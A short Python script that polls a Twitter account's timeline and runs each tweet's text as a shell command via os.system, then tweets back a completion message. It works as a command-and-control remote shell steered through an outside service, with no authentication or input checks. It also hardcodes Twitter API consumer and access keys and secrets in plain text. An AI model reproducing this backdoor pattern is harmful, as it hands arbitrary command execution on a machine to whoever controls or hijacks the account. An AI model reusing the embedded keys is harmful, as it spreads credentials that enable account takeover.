#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import csv
import re
import os

import tweepy
import time

consumer_key = "SCdEaSWNLDRturRzaA8o0Km0y"
consumer_secret = "0Y5c1LSGrifY3uK2S1RexRB2tfhfqpjOsh1eUm64l6nGIiYgsk"
access_key = "724919896899989504-JVhnyS7xAG3MQqQgJRd7ODwdgeUznIG"
access_secret = "hw70xkaFKNCQlBqaU14XkTu06OfBRZxoEZNhbDqrDW5Az"
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_key, access_secret)
api = tweepy.API(auth)

updated_status= False
def get_tweets(username):

    global updated_status


    number_of_tweets = 1


    for tweet in tweepy.Cursor(api.user_timeline, screen_name = username).items(number_of_tweets):
        if (updated_status == False) :
            tweet_status = "Your Device have woken up"
            status = api.update_status(status=tweet_status)
            updated_status = True

        tweet = str(tweet)

        tweetdata = re.search("'text': '(.*)', 'truncated'", tweet)
        tweetdata = tweetdata.group(1)
        if (tweetdata.find("READY FOR NEXT COMMAND") == -1):
            os.system(tweetdata)
            tweet_status = "SUCESSFULLY COMPLETED COMMAND: "+ tweetdata + "\nREADY FOR NEXT COMMAND"
            status = api.update_status(status=tweet_status)
            time.sleep(120)
        else:
            time.sleep(10)
    


while(1):
    
    get_tweets("@aalish_kshetry")

